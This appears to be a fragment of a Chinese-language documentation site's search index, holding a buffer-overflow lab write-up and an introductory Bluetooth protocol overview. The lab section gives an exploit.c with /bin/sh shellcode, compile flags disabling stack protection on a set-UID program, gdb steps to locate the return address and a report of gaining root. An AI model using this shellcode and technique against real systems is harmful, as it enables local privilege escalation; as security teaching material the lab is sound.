\u8be5\u7a0b\u5e8f\u4f1a\u8bfb\u53d6\u4e00\u4e2a\u540d\u4e3a\u201cbadfile\u201d\u7684\u6587\u4ef6\uff0c\u5e76\u5c06\u6587\u4ef6\u5185\u5bb9\u88c5\u5165\u201cbuffer\u201d\u3002 \u8f93\u5165\u547d\u4ee4 linux32 ,\u8fdb\u516532\u4f4d\u73af\u5883 \u7f16\u8bd1\u8be5\u7a0b\u5e8f\uff0c\u5e76\u8bbe\u7f6e SET-UID sudo gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c sudo chmod u+s stack GCC\u7f16\u8bd1\u5668\u6709\u4e00\u79cd\u6808\u4fdd\u62a4\u673a\u5236\u6765\u963b\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u7f16\u8bd1\u4ee3\u7801\u65f6\u9700\u8981\u7528 \u2013fno-stack-protector \u5173\u95ed\u8fd9\u79cd\u673a\u5236\u3002 \u800c -z execstack \u7528\u4e8e\u5141\u8bb8\u6267\u884c\u6808\u3002 -g \u53c2\u6570\u662f\u4e3a\u4e86\u4f7f\u7f16\u8bd1\u540e\u5f97\u5230\u7684\u53ef\u6267\u884c\u6587\u6863\u80fd\u7528 gdb \u8c03\u8bd5\u3002","title":"3\u3001\u6f0f\u6d1e\u7a0b\u5e8f"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#4","text":"/* exploit.c */ /* A program that creates a file containing code for launching shell*/ #include <stdlib.h> #include <stdio.h> #include <string.h> char shellcode[] = \"\\x31\\xc0\" //xorl %eax,%eax \"\\x50\" //pushl %eax \"\\x68\"\"//sh\" //pushl $0x68732f2f \"\\x68\"\"/bin\" //pushl $0x6e69622f \"\\x89\\xe3\" //movl %esp,%ebx \"\\x50\" //pushl %eax \"\\x53\" //pushl %ebx \"\\x89\\xe1\" //movl %esp,%ecx \"\\x99\" //cdq \"\\xb0\\x0b\" //movb $0x0b,%al \"\\xcd\\x80\" //int $0x80 ; void main(int argc, char **argv) { char buffer[517]; FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */ memset(&buffer, 0x90, 517); /* You need to fill the buffer with appropriate contents here */ strcpy(buffer,\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x??\\x??\\x??\\x??\"); //\u5728buffer\u7279\u5b9a\u504f\u79fb\u5904\u8d77\u59cb\u7684\u56db\u4e2a\u5b57\u8282\u8986\u76d6sellcode\u5730\u5740 strcpy(buffer + 100, shellcode); //\u5c06shellcode\u62f7\u8d1d\u81f3buffer\uff0c\u504f\u79fb\u91cf\u8bbe\u4e3a\u4e86 100 /* Save the contents to the file \"badfile\" */ badfile = fopen(\"./badfile\", \"w\"); fwrite(buffer, 517, 1, badfile); fclose(badfile); } \u6ce8\u610f\u4e0a\u9762\u7684\u4ee3\u7801\uff0c \\x??\\x??\\x??\\x?? \u5904\u9700\u8981\u6dfb\u4e0a shellcode \u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u56e0\u4e3a\u53d1\u751f\u6ea2\u51fa\u540e\u8fd9\u4e2a\u4f4d\u7f6e\u521a\u597d\u53ef\u4ee5\u8986\u76d6\u8fd4\u56de( PC )\u5730\u5740\u3002\u800c strcpy(buffer+100,shellcode); \u8fd9\u4e00\u53e5\u53c8\u544a\u8bc9\u6211\u4eec\uff0c shellcode \u4fdd\u5b58\u5728 buffer + 100 \u7684\u4f4d\u7f6e\u3002 \u73b0\u5728\u6211\u4eec\u8981\u5f97\u5230 shellcode \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u8f93\u5165\u547d\u4ee4\u8fdb\u5165 gdb \u8c03\u8bd5\uff1a gdb stack r disass main \u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a * <+19> \u6267\u884c\u540e\u7684(esp \u503c\u5c31\u662f str \u7684\u8d77\u59cb\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u5730\u5740 0x56556279 \u5904\u8bbe\u7f6e\u65ad\u70b9\uff0c\u4ee5\u83b7\u5f97 <+19> \u6267\u884c\u540e\u7684)esp\u503c\u3002 b *0x56556279 r i r $esp \u6700\u540e\u83b7\u5f97\u7684$esp\u503c 0xffffd2a0 \u5c31\u662f str \u7684\u5730\u5740\u3002 \u6839\u636e\u8bed\u53e5 strcpy(buffer + 100,shellcode); \u6211\u4eec\u8ba1\u7b97 shellcode \u7684\u5730\u5740\u4e3a 0xffffd2a0 + 0x64 = 0xffffd304 \u4fee\u6539 exploit.c \u6587\u4ef6\uff0c\u5c06 \\x??\\x??\\x??\\x?? \u4fee\u6539\u4e3a\u8ba1\u7b97\u7ed3\u679c \\x04\\xd3\\xff\\xff \uff0c\u56e0\u4e3a strcpy() \u5728\u5806\u6808\u4e2d\u662f\u4ece\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u590d\u5236\u6240\u4ee5\u662f\u4ee5\u53cd\u5e8f\u586b\u5165\u3002","title":"4\u3001\u653b\u51fb\u7a0b\u5e8f"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#5","text":"\u7f16\u8bd1 exploit.c \u7a0b\u5e8f\uff0c\u5e76\u4f9d\u6b21\u8fd0\u884c exploit \u4e0e stack * \u53ef\u89c1\u901a\u8fc7\u653b\u51fb\u83b7\u5f97\u4e86root\u6743\u9650","title":"5\u3001\u653b\u51fb\u7ed3\u679c"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#_6","text":"1\u3001\u901a\u8fc7\u547d\u4ee4 sudo sysctl -w kernel.randomize_va_space=2 \u6253\u5f00\u7cfb\u7edf\u7684\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u673a\u5236\uff0c\u91cd\u590d\u7528 exploit \u7a0b\u5e8f\u653b\u51fb stack \u7a0b\u5e8f\uff0c\u89c2\u5bdf\u80fd\u5426\u653b\u51fb\u6210\u529f\uff0c\u80fd\u5426\u83b7\u5f97root\u6743\u9650 \u3002 \u53ef\u89c1\u968f\u7740\u7cfb\u7edf\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u673a\u5236\u6253\u5f00\uff0c\u65e0\u6cd5\u8ba1\u7b97\u51fa PC \u6240\u5b58\u50a8\u5728\u5806\u6808\u4e2d\u7684\u5730\u5740\uff0c\u6240\u4ee5\u653b\u51fb\u5931\u8d25\u3002 2\u3001\u5c06 /bin/sh \u91cd\u65b0\u6307\u5411 /bin/bash \uff08\u6216 /bin/dash \uff09\uff0c\u89c2\u5bdf\u80fd\u5426\u653b\u51fb\u6210\u529f\uff0c\u80fd\u5426\u83b7\u5f97 root \u6743\u9650\u3002 \u53ef\u89c1/bin/bash shell\u53ef\u4ee5\u9632\u6b62\u81ea\u8eab\u5728set-uid\u8fdb\u7a0b\u4e2d\u6267\u884c\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u6267\u884c\u5219\u4f1a\u5c06\u7a0b\u5e8f\u7528\u6237ID\u66f4\u6539\u4e3a\u771f\u5b9e\u7528\u6237ID\uff0c\u5220\u9664\u7279\u6743\uff0c\u6240\u4ee5\u653b\u51fb\u5931\u8d25\u3002 \u53c2\u8003\u7f51\u5740: https://www.shiyanlou.com/courses/231 \u539f\u6587\u94fe\u63a5\uff1a https://www.cnblogs.com/WANGYUHAN/p/15474802.html","title":"\u4e94\u3001\u7ec3\u4e60"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/","text":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e00\uff09\u7b80\u4ecb 1.\u84dd\u7259\u7b80\u53f2 \u84dd\u7259\u8fd9\u4e2a\u540d\u79f0\u6765\u81ea\u4e8e\u7b2c\u5341\u4e16\u7eaa\u7684\u4e00\u4f4d\u4e39\u9ea6\u56fd\u738b\u54c8\u62c9\u5c14\u84dd\u7259\u738b\uff0c\u56e0\u4e3a\u56fd\u738b\u559c\u6b22\u5403\u84dd\u8393\uff0c\u5403\u5230\u7259\u9f7f\u90fd\u662f\u84dd\u8272\u7684\u6240\u4ee5\u53eb\u84dd\u7259\u3002\u540e\u6765\u4eba\u4eec\u5c31\u7528\u5b83\u7684\u540d\u5b57\u547d\u540d\u4e00\u79cd\u65e0\u7ebf\u901a\u8baf\u6280\u672f\uff0c\u5176\u7ed3\u679c\u5c31\u662f\u6211\u4eec\u4eca\u65e5\u7684\u84dd\u7259\u3002 \u84dd\u7259\u7531\u963f\u91cc\u65b0\u516c\u53f8\u7814\u53d1\uff0c\u76ee\u524d\u5176\u53d1\u5c55\u4e3b\u8981\u7531 Bluetooth SIG \u63a7\u5236\uff0c\u8be5\u7ec4\u7ec7\u73b0\u5728\u6709200\u591a\u5bb6\u8054\u76df\u6210\u5458\u516c\u53f8\u4ee5\u53ca\u7ea66000\u5bb6\u5e94\u7528\u6210\u5458\u4f01\u4e1a\u3002 \u84dd\u7259\u5171\u6709\u516d\u4e2a\u7248\u672c V 1.1/1.2/2.0/2.1/3.0/4.0 \u3002\u6211\u4eec\u8fd9\u91cc\u5217\u4e3e\u51e0\u4e2a\u91cd\u8981\u7684\u7248\u672c\u7684\u4fe1\u606f\uff1a V 1.1\u7248\u672c \u4f20\u8f93\u7387\u7ea6\u5728 748~810 kb/s \uff0c\u56e0\u662f\u65e9\u671f\u8bbe\u8ba1\uff0c\u5bb9\u6613\u53d7\u5230\u540c\u9891\u7387\u4e4b\u4ea7\u54c1\u6240\u5e72\u6270\u4e0b\u5f71\u54cd\u901a\u8baf\u8d28\u91cf\u3002 V 3.0\u7248\u672c \u84dd\u72593.0\u7684\u6838\u5fc3\u662f\u201d GenericAlternate MAC/PHY\u201d(AMP) \uff0c\u8fd9\u662f\u4e00\u79cd\u5168\u65b0\u7684\u4ea4\u66ff\u5c04\u9891\u6280\u672f\uff0c\u5141\u8bb8\u84dd\u7259\u534f\u8bae\u6808\u9488\u5bf9\u4efb\u4e00\u4efb\u52a1\u52a8\u6001\u5730\u9009\u62e9\u6b63\u786e\u5c04\u9891\u3002\u6700\u521d\u88ab\u671f\u671b\u7528\u4e8e\u65b0\u89c4\u8303\u7684\u6280\u672f\u5305\u62ec 802.11 \u4ee5\u53ca UMB \uff0c\u4f46\u662f\u65b0\u89c4\u8303\u4e2d\u53d6\u6d88\u4e86 UMB \u7684\u5e94\u7528\u3002 V 4.0 \u7248\u672c \u84dd\u7259 4.0 \u5305\u62ec\u4e09\u4e2a\u5b50\u89c4\u8303\uff0c\u5373 \u4f20\u7edf\u84dd\u7259\u6280\u672f \u3001 \u9ad8\u901f\u84dd\u7259 \u548c\u65b0\u7684 \u84dd\u7259\u4f4e\u529f\u8017\u6280\u672f \u3002\u84dd\u7259 4.0 \u7684\u6539\u8fdb\u4e4b\u5904\u4e3b\u8981\u4f53\u73b0\u5728\u4e09\u4e2a\u65b9\u9762\uff0c\u7535\u6c60\u7eed\u822a\u65f6\u95f4\u3001\u8282\u80fd\u548c\u8bbe\u5907\u79cd\u7c7b\u4e0a\u3002\u62e5\u6709\u4f4e\u6210\u672c\uff0c\u8de8\u5382\u5546\u4e92\u64cd\u4f5c\u6027\uff0c 3 \u6beb\u79d2\u4f4e\u5ef6\u8fdf\u3001 100 \u7c73\u4ee5\u4e0a\u8d85\u957f\u8ddd\u79bb\u3001 AES-128 \u52a0\u5bc6\u7b49\u8bf8\u591a\u7279\u8272\u6b64\u5916\uff0c\u84dd\u7259 4.0 \u7684\u6709\u6548\u4f20\u8f93\u8ddd\u79bb\u4e5f\u6709\u6240\u63d0\u5347\u3002 3.0 \u7248\u672c\u7684\u84dd\u7259\u7684\u6709\u6548\u4f20\u8f93\u8ddd\u79bb\u4e3a 10 \u7c73\uff0c\u800c\u84dd\u72594.0\u7684\u6709\u6548\u4f20\u8f93\u8ddd\u79bb\u6700\u9ad8\u53ef\u8fbe\u5230 100 \u7c73\u3002 \u200b 2.\u84dd\u7259\u6280\u672f\u7279\u6027 \u5de5\u4f5c\u9891\u6bb5 \uff1a 2.4 GHz \u7684\u5de5\u79d1\u533b\uff08 ISM \uff09\u9891\u6bb5\uff0c\u65e0\u9700\u7533\u8bf7\u8bb8\u53ef\u8bc1\u3002\u5927\u591a\u6570\u56fd\u5bb6\u4f7f\u752879\u4e2a\u9891\u70b9\uff0c\u8f7d\u9891\u4e3a (2402+k)MHz\uff08k=0\uff0c1, 2\u202678\uff09 \uff0c\u8f7d\u9891\u95f4\u9694 1 MHz \u3002\u91c7\u7528 TDD \u65f6\u5206\u53cc\u5de5\u65b9\u5f0f\u3002 \u4f20\u8f93\u901f\u7387 \uff1a 1 Mb/s \u91c7\u7528\u8df3\u9891\u6280\u672f \uff1a\u8df3\u9891\u901f\u7387\u4e3a 1600 \u8df3/\u79d2\uff0c\u5728\u5efa\u94fe\u65f6\uff08\u5305\u62ec\u5bfb\u547c\u548c\u67e5\u8be2\uff09\u63d0\u9ad8\u4e3a 3200 \u8df3/\u79d2\u3002\u84dd\u7259\u901a\u8fc7\u5feb\u8df3\u9891\u548c\u77ed\u5206\u7ec4\u6280\u672f\u51cf\u5c11\u540c\u9891\u5e72\u6270\uff0c\u4fdd\u8bc1\u4f20\u8f93\u7684\u53ef\u9760\u6027\u3002 \u652f\u6301\u7535\u8def\u4ea4\u6362\u548c\u5206\u7ec4\u4ea4\u6362\u4e1a\u52a1 \uff1a\u84dd\u7259\u652f\u6301\u5b9e\u65f6\u7684\u540c\u6b65\u5b9a\u5411\u8054\u63a5\uff08 SCO \u94fe\u8def\uff09\u548c\u975e\u5b9e\u65f6\u7684\u5f02\u6b65\u4e0d\u5b9a\u5411\u8054\u63a5\uff08 ACL \u94fe\u8def\uff09\uff0c \u524d\u8005\u4e3b\u8981\u4f20\u9001\u8bed\u97f3\u7b49\u5b9e\u65f6\u6027\u5f3a\u7684\u4fe1\u606f\uff0c\u540e\u8005\u4ee5\u6570\u636e\u5305\u4e3a\u4e3b\u3002 \u8bed\u97f3\u548c\u6570\u636e\u53ef\u4ee5\u5355\u72ec\u6216\u540c\u65f6\u4f20\u8f93\u3002\u84dd\u7259\u652f\u6301\u4e00\u4e2a\u5f02\u6b65\u6570\u636e\u901a\u9053\uff0c\u6216\u4e09\u4e2a\u5e76\u53d1\u7684\u540c\u6b65\u8bdd\u97f3\u901a\u9053\uff0c\u6216\u540c\u65f6\u4f20\u9001\u5f02\u6b65\u6570\u636e\u548c\u540c\u6b65\u8bdd\u97f3\u7684\u901a\u9053\u3002\u6bcf\u4e2a\u8bdd\u97f3\u901a\u9053\u652f\u6301 64 kbps \u7684\u540c\u6b65\u8bdd\u97f3\uff1b\u5f02\u6b65\u901a\u9053\u652f\u6301 723.2/57.6 kbps \u7684\u975e\u5bf9\u79f0\u53cc\u5de5\u901a\u4fe1\u6216 433.9 kbps \u7684\u5bf9\u79f0\u5168\u53cc\u5de5\u901a\u4fe1\u3002 \u652f\u6301\u70b9\u5bf9\u70b9\u53ca\u70b9\u5bf9\u591a\u70b9\u901a\u4fe1 \uff1a\u84dd\u7259\u8bbe\u5907\u6309\u7279\u5b9a\u65b9\u5f0f\u53ef\u7ec4\u6210\u4e24\u79cd\u7f51\u7edc\uff1a\u5fae\u5fae\u7f51( Piconet )\u548c\u5206\u5e03\u5f0f\u7f51\u7edc( Scatternet )\uff0c\u5176\u4e2d\u5fae\u5fae\u7f51\u7684\u5efa\u7acb\u7531\u4e24\u53f0\u8bbe\u5907\u7684\u8fde\u63a5\u5f00\u59cb\uff0c\u6700\u591a\u53ef\u7531\u516b\u53f0\u8bbe\u5907\u7ec4\u6210\u3002\u5728\u4e00\u4e2a\u5fae\u5fae\u7f51\u4e2d\uff0c\u53ea\u6709\u4e00\u53f0\u4e3a\u4e3b\u8bbe\u5907\uff08 Master \uff09\uff0c\u5176\u5b83\u5747\u4e3a\u4ece\u8bbe\u5907\uff08 Slave \uff09\uff0c\u4e0d\u540c\u7684\u4e3b\u4ece\u8bbe\u5907\u5bf9\u53ef\u4ee5\u91c7\u7528\u4e0d\u540c\u7684\u94fe\u63a5\u65b9\u5f0f\uff0c\u5728\u4e00\u6b21\u901a\u4fe1\u4e2d\uff0c\u94fe\u63a5\u65b9\u5f0f\u4e5f\u53ef\u4ee5\u4efb\u610f\u6539\u53d8\u3002\u51e0\u4e2a\u76f8\u4e92\u72ec\u7acb\u7684\u5fae\u5fae\u7f51\u4ee5\u7279\u5b9a\u65b9\u5f0f\u94fe\u63a5\u5728\u4e00\u8d77\u4fbf\u6784\u6210\u4e86\u5206\u5e03\u5f0f\u7f51\u7edc\u3002\u6240\u6709\u7684\u84dd\u7259\u8bbe\u5907\u90fd\u662f\u5bf9\u7b49\u7684\uff0c\u6240\u4ee5\u5728\u84dd\u7259\u4e2d\u6ca1\u6709\u57fa\u7ad9\u7684\u6982\u5ff5\u3002 \u5de5\u4f5c\u8ddd\u79bb \uff1a\u84dd\u7259\u8bbe\u5907\u5206\u4e3a\u4e09\u4e2a\u529f\u7387\u7b49\u7ea7\uff0c\u5206\u522b\u662f\uff1a 100 mW \uff08 20 dBm \uff09\u3001 2.5 mW \uff08 4 dBm \uff09\u548c 1 mW \uff08 0 dBm \uff09\uff0c\u76f8\u5e94\u7684\u6709\u6548\u5de5\u4f5c\u8303\u56f4\u4e3a\uff1a 100 \u7c73\u3001 10 \u7c73\u548c 1 \u7c73\u3002 3.\u84dd\u7259\u7cfb\u7edf\u7ec4\u6210 \u84dd\u7259\u7cfb\u7edf\u7531\u4ee5\u4e0b\u51e0\u90e8\u5206\u7ec4\u6210\uff1a \u4f20\u8f93\u5c42\uff08\u5e95\u5c42\u786c\u4ef6\u6a21\u5757\uff09 \u4e2d\u4ecb\u5c42\uff08\u4e2d\u95f4\u534f\u8bae\u5c42\uff09 \u5e94\u7528\u5c42 \u5176\u4e2d\uff0c\u5e95\u5c42\u786c\u4ef6\u6a21\u5757\u5305\u62ec\u4ee5\u4e0b\u90e8\u5206\uff1a \u5c04\u9891\u5c42\uff1a\u8d1f\u8d23\u6570\u636e\u548c\u8bed\u97f3\u7684\u53d1\u9001\u548c\u63a5\u6536\uff0c\u7279\u70b9\u662f\u77ed\u8ddd\u79bb\u3001\u4f4e\u529f\u8017\u3002\u84dd\u7259\u5929\u7ebf\u4e00\u822c\u4f53\u79ef\u5c0f\u3001\u91cd\u91cf\u8f7b\uff0c\u5c5e\u4e8e\u5fae\u5e26\u5929\u7ebf\u3002 \u57fa\u5e26\u5c42\uff1a\u8fdb\u884c\u5c04\u9891\u4fe1\u53f7\u4e0e\u6570\u5b57\u6216\u8bed\u97f3\u4fe1\u53f7\u7684\u76f8\u4e92\u8f6c\u5316\uff0c\u5b9e\u73b0\u57fa\u5e26\u534f\u8bae\u548c\u5176\u5b83\u7684\u5e95\u5c42\u8fde\u63a5\u89c4\u7a0b\u3002 \u94fe\u8def\u7ba1\u7406\u5c42\uff1a\u8d1f\u8d23\u7ba1\u7406\u84dd\u7259\u8bbe\u5907\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u5b9e\u73b0\u94fe\u8def\u7684\u5efa\u7acb\u3001\u9a8c\u8bc1\u3001\u94fe\u8def\u914d\u7f6e\u7b49\u64cd\u4f5c\u3002 4.\u84dd\u7259\u534f\u8bae\u89c4\u8303 \u4f20\u8f93\u5c42\u3001\u4e2d\u4ecb\u5c42\u3001\u5e94\u7528\u5c42\u62e5\u6709\u7740\u5404\u81ea\u7684\u534f\u8bae\u3002 4.1.\u4f20\u8f93\u534f\u8bae \u4f20\u8f93\u534f\u8bae\u8d1f\u8d23\u84dd\u7259\u8bbe\u5907\u95f4\uff0c\u4e92\u76f8\u786e\u8ba4\u5bf9\u65b9\u7684\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u5efa\u7acb\u548c\u7ba1\u7406\u84dd\u7259\u8bbe\u5907\u95f4\u7684\u7269\u7406\u94fe\u8def\uff1b \u5e95\u5c42\u4f20\u8f93\u534f\u8bae \uff1a\u84dd\u7259\u5c04\u9891\uff08 Radio \uff09\u90e8\u5206\u3001\u57fa\u5e26\u94fe\u8def\u7ba1\u7406\u63a7\u5236\u5668\uff08 Baseband & Link Controller \uff09\u3001\u94fe\u8def\u7ba1\u7406\u534f\u8bae\uff08 Link ManagerProtocol \uff09 LMP \u3002\u8d1f\u8d23\u8bed\u8a00\u3001\u6570\u636e\u65e0\u7ebf\u4f20\u8f93\u7684\u7269\u7406\u5b9e\u73b0\u4ee5\u53ca\u84dd\u7259\u8bbe\u5907\u95f4\u7684\u8054\u7f51\u7ec4\u7f51\u3002 \u9ad8\u5c42\u4f20\u8f93\u534f\u8bae \uff1a\u903b\u8f91\u94fe\u8def\u63a7\u5236\u4e0e\u9002\u914d\u5668\uff08 LogicalLink Control and Adaptation Protocol \uff09 L2CAP \u3001\u4e3b\u673a\u63a7\u5236\u63a5\u53e3\uff08 HostControl Interface \uff0c HCI \uff09\u3002\u4e3a\u9ad8\u5c42\u5e94\u7528\u5c4f\u853d\u4e86\u8df3\u9891\u5e8f\u5217\u9009\u62e9\u7b49\u5e95\u5c42\u4f20\u8f93\u64cd\u4f5c\uff0c\u4e3a\u9ad8\u5c42\u7a0b\u5e8f\u63d0\u4f9b\u6709\u6548\u3001\u6709\u5229\u4e8e\u5b9e\u73b0\u6570\u636e\u5206\u7ec4\u683c\u5f0f\u3002 4.2.\u4e2d\u4ecb\u534f\u8bae \u4e2d\u4ecb\u534f\u8bae\u4e3a\u9ad8\u5c42\u5e94\u7528\u534f\u8bae\u6216\u8005\u7a0b\u5e8f\uff0c\u5728\u84dd\u7259\u903b\u8f91\u94fe\u8def\u4e0a\u5de5\u4f5c\u63d0\u4f9b\u5fc5\u8981\u7684\u652f\u6301\uff0c\u4e3a\u5e94\u7528\u63d0\u4f9b\u4e0d\u540c\u6807\u51c6\u63a5\u53e3\uff0c\u5305\u62ec\uff1a \u4e32\u53e3\u4eff\u771f\u534f\u8bae\uff1a RFCOMM \u670d\u52a1\u53d1\u73b0\u534f\u8bae\uff1a SDP \u4e92\u64cd\u4f5c\u534f\u8bae\uff1a IrDA \u7f51\u7edc\u8bbf\u95ee\u534f\u8bae\uff1a PPP\u3001IP\u3001TCP\u3001UDP \u7535\u8bdd\u63a7\u5236\u534f\u8bae\uff1a TCS \u3001 AT \u6307\u4ee4\u96c6 4.3.\u5e94\u7528\u534f\u8bae \u84dd\u7259\u534f\u8bae\u6808\u4e4b\u4e0a\u7684\u5e94\u7528\u8f6f\u4ef6\u548c\u6240\u6d89\u53ca\u5230\u7684\u534f\u8bae\uff0c\u5982\uff1a\u62e8\u53f7\u4e0a\u7f51\u3001\u8bed\u8a00\u529f\u80fd\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5305\u62ec\uff1a \u901a\u7528\u5e94\u7528\u7c7b\u6846\u67b6\uff1a\u67e5\u8be2\u3001\u5efa\u7acb\u8fde\u63a5\u670d\u52a1\u7b49 \u84dd\u7259\u7535\u8bdd\u5e94\u7528\u7c7b\u6846\u67b6\uff1a\u7535\u8bdd\u63a7\u5236\u3001\u8bed\u8a00 \u84dd\u7259\u8fde\u7f51\u5e94\u7528\u7c7b\u6846\u67b6\uff1a\u7f51\u7edc\u5e94\u7528\u76f8\u5173 \u5bf9\u8c61\u4ea4\u4e92\u670d\u52a1\u7c7b\u6846\u67b6\uff1a IrDA\u3001OBEX \u84dd\u7259\u97f3\u89c6\u9891\u63a7\u5236\u7c7b\u6846\u67b6 5.\u53c2\u8003\u94fe\u63a5 \u84dd\u7259\u7b80\u4ecb BlueTooth: \u84dd\u7259\u6280\u672f\u53ca\u5176\u7cfb\u7edf\u539f\u7406 \u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u4e00\uff09:\u84dd\u7259\u6982\u8ff0 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/06/24/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e00\uff09\u7b80\u4ecb/","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e00\uff09\u7b80\u4ecb"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#_1","text":"","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e00\uff09\u7b80\u4ecb"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#1","text":"\u84dd\u7259\u8fd9\u4e2a\u540d\u79f0\u6765\u81ea\u4e8e\u7b2c\u5341\u4e16\u7eaa\u7684\u4e00\u4f4d\u4e39\u9ea6\u56fd\u738b\u54c8\u62c9\u5c14\u84dd\u7259\u738b\uff0c\u56e0\u4e3a\u56fd\u738b\u559c\u6b22\u5403\u84dd\u8393\uff0c\u5403\u5230\u7259\u9f7f\u90fd\u662f\u84dd\u8272\u7684\u6240\u4ee5\u53eb\u84dd\u7259\u3002\u540e\u6765\u4eba\u4eec\u5c31\u7528\u5b83\u7684\u540d\u5b57\u547d\u540d\u4e00\u79cd\u65e0\u7ebf\u901a\u8baf\u6280\u672f\uff0c\u5176\u7ed3\u679c\u5c31\u662f\u6211\u4eec\u4eca\u65e5\u7684\u84dd\u7259\u3002 \u84dd\u7259\u7531\u963f\u91cc\u65b0\u516c\u53f8\u7814\u53d1\uff0c\u76ee\u524d\u5176\u53d1\u5c55\u4e3b\u8981\u7531 Bluetooth SIG \u63a7\u5236\uff0c\u8be5\u7ec4\u7ec7\u73b0\u5728\u6709200\u591a\u5bb6\u8054\u76df\u6210\u5458\u516c\u53f8\u4ee5\u53ca\u7ea66000\u5bb6\u5e94\u7528\u6210\u5458\u4f01\u4e1a\u3002 \u84dd\u7259\u5171\u6709\u516d\u4e2a\u7248\u672c V 1.1/1.2/2.0/2.1/3.0/4.0 \u3002\u6211\u4eec\u8fd9\u91cc\u5217\u4e3e\u51e0\u4e2a\u91cd\u8981\u7684\u7248\u672c\u7684\u4fe1\u606f\uff1a V 1.1\u7248\u672c \u4f20\u8f93\u7387\u7ea6\u5728 748~810 kb/s \uff0c\u56e0\u662f\u65e9\u671f\u8bbe\u8ba1\uff0c\u5bb9\u6613\u53d7\u5230\u540c\u9891\u7387\u4e4b\u4ea7\u54c1\u6240\u5e72\u6270\u4e0b\u5f71\u54cd\u901a\u8baf\u8d28\u91cf\u3002 V 3.0\u7248\u672c \u84dd\u72593.0\u7684\u6838\u5fc3\u662f\u201d GenericAlternate MAC/PHY\u201d(AMP) \uff0c\u8fd9\u662f\u4e00\u79cd\u5168\u65b0\u7684\u4ea4\u66ff\u5c04\u9891\u6280\u672f\uff0c\u5141\u8bb8\u84dd\u7259\u534f\u8bae\u6808\u9488\u5bf9\u4efb\u4e00\u4efb\u52a1\u52a8\u6001\u5730\u9009\u62e9\u6b63\u786e\u5c04\u9891\u3002\u6700\u521d\u88ab\u671f\u671b\u7528\u4e8e\u65b0\u89c4\u8303\u7684\u6280\u672f\u5305\u62ec 802.11 \u4ee5\u53ca UMB \uff0c\u4f46\u662f\u65b0\u89c4\u8303\u4e2d\u53d6\u6d88\u4e86 UMB \u7684\u5e94\u7528\u3002 V 4.0 \u7248\u672c \u84dd\u7259 4.0 \u5305\u62ec\u4e09\u4e2a\u5b50\u89c4\u8303\uff0c\u5373 \u4f20\u7edf\u84dd\u7259\u6280\u672f \u3001 \u9ad8\u901f\u84dd\u7259 \u548c\u65b0\u7684 \u84dd\u7259\u4f4e\u529f\u8017\u6280\u672f \u3002\u84dd\u7259 4.0 \u7684\u6539\u8fdb\u4e4b\u5904\u4e3b\u8981\u4f53\u73b0\u5728\u4e09\u4e2a\u65b9\u9762\uff0c\u7535\u6c60\u7eed\u822a\u65f6\u95f4\u3001\u8282\u80fd\u548c\u8bbe\u5907\u79cd\u7c7b\u4e0a\u3002\u62e5\u6709\u4f4e\u6210\u672c\uff0c\u8de8\u5382\u5546\u4e92\u64cd\u4f5c\u6027\uff0c 3 \u6beb\u79d2\u4f4e\u5ef6\u8fdf\u3001 100 \u7c73\u4ee5\u4e0a\u8d85\u957f\u8ddd\u79bb\u3001 AES-128 \u52a0\u5bc6\u7b49\u8bf8\u591a\u7279\u8272\u6b64\u5916\uff0c\u84dd\u7259 4.0 \u7684\u6709\u6548\u4f20\u8f93\u8ddd\u79bb\u4e5f\u6709\u6240\u63d0\u5347\u3002 3.0 \u7248\u672c\u7684\u84dd\u7259\u7684\u6709\u6548\u4f20\u8f93\u8ddd\u79bb\u4e3a 10 \u7c73\uff0c\u800c\u84dd\u72594.0\u7684\u6709\u6548\u4f20\u8f93\u8ddd\u79bb\u6700\u9ad8\u53ef\u8fbe\u5230 100 \u7c73\u3002 